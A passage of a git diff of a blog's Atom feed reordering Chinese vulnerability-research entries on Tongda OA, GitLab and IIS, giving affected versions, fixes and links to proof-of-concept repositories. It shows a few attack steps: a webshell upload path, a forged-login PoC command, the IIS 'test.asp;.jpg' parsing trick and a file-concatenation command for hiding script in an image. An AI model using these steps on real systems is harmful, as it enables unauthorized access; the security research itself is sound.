class="line">-----------------------------157569659620694477453109954647--</span><br></pre></td></tr></table></figure><p>Webshell地址：127.0.0.1/api/conf.php，exp中api/conf表示api为文件上传后的路径，conf为文件名</p><h2 id="11-5-前台任意用户伪造登录漏洞"><a href="#11-5-前台任意用户伪造登录漏洞" class="headerlink" title="[11.5]-前台任意用户伪造登录漏洞"></a>[11.5]-前台任意用户伪造登录漏洞</h2><p><strong>漏洞概述</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line">通达OA &lt; 11.5</span><br><span class="line">通达OA = 2017</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><p>1、使用<a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User#tongdaoa-fake-user" target="_blank" rel="noopener">POC</a>获取Cookie</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 poc.py -v 11 -url http://xxx.com</span><br></pre></td></tr></table></figure><p>2、浏览器插件<code>Cookie-Editor</code>替换Cookie即可登录</p><p><strong>修复建议</strong></p><p>升级到最新版本</p><p><strong>11.5（未授权和SQL注入的POC）</strong></p><p><a href="https://4m.cn/1XlPK" target="_blank" rel="noopener">https://4m.cn/1XlPK</a></p><h2 id="11-6-未授权RCE-危险操作"><a href="#11-6-未授权RCE-危险操作" class="headerlink" title="[11.6]-未授权RCE(危险操作)"></a>[11.6]-未授权RCE(危险操作)</h2><p><strong>漏洞概述</strong></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line"><span class="attribute">V11.6</span></span><br></pre></td></tr></table></figure><p>通过任意文件漏洞删除上传点包含的身份验证文件，从而造成未授权访问实现任意文件上传</p><p><strong>漏洞利用</strong></p><p>POC下载：<a href="https://github.com/TomAPU/poc_and_exp/blob/master/rce.py" target="_blank" rel="noopener">https://github.com/TomAPU/poc_and_exp/blob/master/rce.py</a></p><p><strong>修复建议</strong></p><p>升级到最新版本</p><p><strong>漏洞分析</strong></p><p><a href="https://xz.aliyun.com/t/8430" target="_blank" rel="noopener">https://xz.aliyun.com/t/8430</a></p><h2 id="全版本-文件上传-文件包含GetShell"><a href="#全版本-文件上传-文件包含GetShell" class="headerlink" title="[全版本]-文件上传+文件包含GetShell"></a>[全版本]-文件上传+文件包含GetShell</h2><p><strong>漏洞概述</strong></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line"><span class="attribute">V11</span></span><br><span class="line"><span class="attribute">2017</span></span><br><span class="line"><span class="attribute">2016</span></span><br><span class="line"><span class="attribute">2015</span></span><br><span class="line"><span class="attribute">2013</span></span><br><span class="line"><span class="attribute">2013增强版</span></span><br></pre></td></tr></table></figure><p>通过绕过身份认证（或弱口令）, 攻击者可上传任意文件，配合文件包含即可出发远程恶意代码执行</p><p><strong>漏洞利用</strong></p><p>POC：</p><p><a href="https://github.com/ghtwf01/td_rce" target="_blank" rel="noopener">https://github.com/ghtwf01/td_rce</a></p><p><a href="https://github.com/php00py/tongdaOA" target="_blank" rel="noopener">https://github.com/php00py/tongdaOA</a></p><p><strong>修复建议</strong></p><p>升级到最新版本</p><p><strong>漏洞分析</strong></p><p><a href="https://xz.aliyun.com/t/7437" target="_blank" rel="noopener">https://xz.aliyun.com/t/7437</a></p><h2 id="后台Getshell"><a href="#后台Getshell" class="headerlink" title="后台Getshell"></a>后台Getshell</h2><p>🔸 <a href="https://www.cnblogs.com/yuzly/p/13606314.html" target="_blank" rel="noopener">通达OA 11.2后台getshell</a><br>🔸 <a href="https://www.cnblogs.com/yuzly/p/13690737.html" target="_blank" rel="noopener">通达OA 11.7 后台sql注入getshell漏洞</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;应用简介&quot;&gt;&lt;a href=&quot;#应用简介&quot; class=&quot;headerlink&quot; title=&quot;应用简介&quot;&gt;&lt;/a&gt;应用简介&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.tongda2000.com/&quot; target=&quot;_blank&quot; rel=&quot;noo
+      
+    
+    </summary>
+    
+    
+      <category term="【4】漏洞研究" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
+    
+      <category term="Tongda-OA(通达)" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Tongda-OA-%E9%80%9A%E8%BE%BE/"/>
     
     
   </entry>
@@ -387,33 +387,6 @@
   </entry>
   
   <entry>
-    <title>GitLab</title>
-    <link href="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/GitLab/gitlab/"/>
-    <id>https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/GitLab/gitlab/</id>
-    <published>2020-12-14T01:55:31.831Z</published>
-    <updated>2020-12-11T11:39:18.881Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="应用简介"><a href="#应用简介" class="headerlink" title="应用简介"></a>应用简介</h2><p>GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。</p><p>GitLab是由GitLabInc.开发，使用MIT许可证的基于网络的Git仓库管理工具，且具有wiki和issue跟踪功能</p><h2 id="CVE-2020-10977-任意文件读取"><a href="#CVE-2020-10977-任意文件读取" class="headerlink" title="[CVE-2020-10977]-任意文件读取"></a>[CVE-2020-10977]-任意文件读取</h2><p><strong>漏洞概述</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line">GitLab EE &gt;=8.5，&lt;=12.9</span><br><span class="line">GitLab CE &gt;=8.5，&lt;=12.9</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><p>POC：<a href="https://github.com/thewhiteh4t/cve-2020-10977" target="_blank" rel="noopener">https://github.com/thewhiteh4t/cve-2020-10977</a></p><p>需要登录</p><p><strong>修复建议</strong></p><p>1、检查版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /opt/gitlab/embedded/service/gitlab-rails/VERSION</span><br></pre></td></tr></table></figure><p>2、下载最新版本</p><h2 id="CVE-2018-14364-远程代码执行漏洞"><a href="#CVE-2018-14364-远程代码执行漏洞" class="headerlink" title="[CVE-2018-14364]-远程代码执行漏洞"></a>[CVE-2018-14364]-远程代码执行漏洞</h2><p><strong>漏洞概述</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line">Gitlab &gt;= 8.9.0</span><br><span class="line">GitLab &lt; 10.7.7</span><br><span class="line">GitLab &lt; 10.8.6</span><br><span class="line">GitLab &lt; 11.0.4</span><br></pre></td></tr></table></figure><p><strong>漏洞分析和利用</strong></p><p><a href="https://xz.aliyun.com/t/2661#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2661#toc-2</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;应用简介&quot;&gt;&lt;a href=&quot;#应用简介&quot; class=&quot;headerlink&quot; title=&quot;应用简介&quot;&gt;&lt;/a&gt;应用简介&lt;/h2&gt;&lt;p&gt;GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。&lt;/p&gt;
-&lt;p
-      
-    
-    </summary>
-    
-    
-      <category term="【4】漏洞研究" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
-    
-      <category term="GitLab" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/GitLab/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>Drupal</title>
     <link href="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Drupal/drupal/"/>
     <id>https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Drupal/drupal/</id>
@@ -436,6 +409,33 @@
       <category term="【4】漏洞研究" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
     
       <category term="Drupal" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Drupal/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>GitLab</title>
+    <link href="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/GitLab/gitlab/"/>
+    <id>https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/GitLab/gitlab/</id>
+    <published>2020-12-14T01:55:31.831Z</published>
+    <updated>2020-12-11T11:39:18.881Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="应用简介"><a href="#应用简介" class="headerlink" title="应用简介"></a>应用简介</h2><p>GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。</p><p>GitLab是由GitLabInc.开发，使用MIT许可证的基于网络的Git仓库管理工具，且具有wiki和issue跟踪功能</p><h2 id="CVE-2020-10977-任意文件读取"><a href="#CVE-2020-10977-任意文件读取" class="headerlink" title="[CVE-2020-10977]-任意文件读取"></a>[CVE-2020-10977]-任意文件读取</h2><p><strong>漏洞概述</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line">GitLab EE &gt;=8.5，&lt;=12.9</span><br><span class="line">GitLab CE &gt;=8.5，&lt;=12.9</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><p>POC：<a href="https://github.com/thewhiteh4t/cve-2020-10977" target="_blank" rel="noopener">https://github.com/thewhiteh4t/cve-2020-10977</a></p><p>需要登录</p><p><strong>修复建议</strong></p><p>1、检查版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /opt/gitlab/embedded/service/gitlab-rails/VERSION</span><br></pre></td></tr></table></figure><p>2、下载最新版本</p><h2 id="CVE-2018-14364-远程代码执行漏洞"><a href="#CVE-2018-14364-远程代码执行漏洞" class="headerlink" title="[CVE-2018-14364]-远程代码执行漏洞"></a>[CVE-2018-14364]-远程代码执行漏洞</h2><p><strong>漏洞概述</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line">Gitlab &gt;= 8.9.0</span><br><span class="line">GitLab &lt; 10.7.7</span><br><span class="line">GitLab &lt; 10.8.6</span><br><span class="line">GitLab &lt; 11.0.4</span><br></pre></td></tr></table></figure><p><strong>漏洞分析和利用</strong></p><p><a href="https://xz.aliyun.com/t/2661#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2661#toc-2</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;应用简介&quot;&gt;&lt;a href=&quot;#应用简介&quot; class=&quot;headerlink&quot; title=&quot;应用简介&quot;&gt;&lt;/a&gt;应用简介&lt;/h2&gt;&lt;p&gt;GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。&lt;/p&gt;
+&lt;p
+      
+    
+    </summary>
+    
+    
+      <category term="【4】漏洞研究" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
+    
+      <category term="GitLab" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/GitLab/"/>
     
     
   </entry>
@@ -468,32 +468,6 @@
   </entry>
   
   <entry>
-    <title>IIS</title>
-    <link href="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/IIS/iis/"/>
-    <id>https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/IIS/iis/</id>
-    <published>2020-12-14T01:55:31.831Z</published>
-    <updated>2020-12-09T08:14:14.122Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="IIS简介"><a href="#IIS简介" class="headerlink" title="IIS简介"></a>IIS简介</h2><p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务</p><h2 id="PUT写文件漏洞"><a href="#PUT写文件漏洞" class="headerlink" title="PUT写文件漏洞"></a>PUT写文件漏洞</h2><p><strong>漏洞概述</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响版本</span><br><span class="line">IIS 6.0</span><br></pre></td></tr></table></figure><p>IIS Server在Web服务扩展中开启了WebDAV，配置了可以写入的权限，造成任意文件上传</p><p><strong>漏洞利用</strong>：借助BurpSuite写入即可</p><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p><strong>漏洞概述</strong></p><p>IIS 6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.asp;.jpg</span><br></pre></td></tr></table></figure><hr><p>IIS 7/7.5在Fast-CGI运行模式下</p><p>在一个文件路径(/xx.jpg)后面加上/.xx.php会将/xx.jpg/.xx.php 解析为 php 文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy a.jpg&#x2F;b + b.txt&#x2F;a c.jpg</span><br></pre></td></tr></table></figure><p><strong>修复建议</strong></p><p>1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件；</p><p>2）限制上传的脚本执行权限，不允许执行脚本；</p><p>3）配置cgi.pathinfo为0 (php.ini中)</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;IIS简介&quot;&gt;&lt;a href=&quot;#IIS简介&quot; class=&quot;headerlink&quot; title=&quot;IIS简介&quot;&gt;&lt;/a&gt;IIS简介&lt;/h2&gt;&lt;p&gt;IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于
-      
-    
-    </summary>
-    
-    
-      <category term="【4】漏洞研究" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
-    
-      <category term="IIS" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/IIS/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>Joomla</title>
     <link href="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Joomla/joomla/"/>
     <id>https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Joomla/joomla/</id>
@@ -516,6 +490,32 @@
       <category term="【4】漏洞研究" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
     
       <category term="Joomla" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Joomla/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>IIS</title>
+    <link href="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/IIS/iis/"/>
+    <id>https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/IIS/iis/</id>
+    <published>2020-12-14T01:55:31.831Z</published>
+    <updated>2020-12-09T08:14:14.122Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="IIS简介"><a href="#IIS简介" class="headerlink" title="IIS简介"></a>IIS简介</h2><p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务</p><h2 id="PUT写文件漏洞"><a href="#PUT写文件漏洞" class="headerlink" title="PUT写文件漏洞"></a>PUT写文件漏洞</h2><p><strong>漏洞概述</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响版本</span><br><span class="line">IIS 6.0</span><br></pre></td></tr></table></figure><p>IIS Server在Web服务扩展中开启了WebDAV，配置了可以写入的权限，造成任意文件上传</p><p><strong>漏洞利用</strong>：借助BurpSuite写入即可</p><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p><strong>漏洞概述</strong></p><p>IIS 6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.asp;.jpg</span><br></pre></td></tr></table></figure><hr><p>IIS 7/7.5在Fast-CGI运行模式下</p><p>在一个文件路径(/xx.jpg)后面加上/.xx.php会将/xx.jpg/.xx.php 解析为 php 文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy a.jpg&#x2F;b + b.txt&#x2F;a c.jpg</span><br></pre></td></tr></table></figure><p><strong>修复建议</strong></p><p>1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件；</p><p>2）限制上传的脚本执行权限，不允许执行脚本；</p><p>3）配置cgi.pathinfo为0 (php.ini中)</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;IIS简介&quot;&gt;&lt;a href=&quot;#IIS简介&quot; class=&quot;headerlink&quot; title=&quot;IIS简介&quot;&gt;&lt;/a&gt;IIS简介&lt;/h2&gt;&lt;p&gt;IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于
+      
+    
+    </summary>
+    
+    
+      <category term="【4】漏洞研究" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
+    
+      <category term="IIS" scheme="https://wintrysec.github.io/categories/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/IIS/"/>
     
     
   </entry>
